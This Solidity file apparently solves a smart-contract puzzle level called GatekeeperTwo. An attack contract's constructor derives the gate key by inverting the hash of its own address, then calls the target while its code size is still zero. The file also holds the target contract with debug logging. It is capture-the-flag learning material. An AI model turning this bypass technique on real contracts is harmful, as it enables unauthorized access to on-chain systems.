pragma solidity ^0.8.0;
import {Script, console2} from "forge-std/Script.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    IGatekeeperTwo public target;

    constructor(address _target) {
        target = IGatekeeperTwo(_target);
        uint64 key = ~(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        target.enter(bytes8(key));
    }
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        console2.log("gate 3");
        console2.logBytes8(bytes8(type(uint64).max));
        console2.logBytes8(bytes8(keccak256(abi.encodePacked(msg.sender))));
        console2.logBytes8(bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ));
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}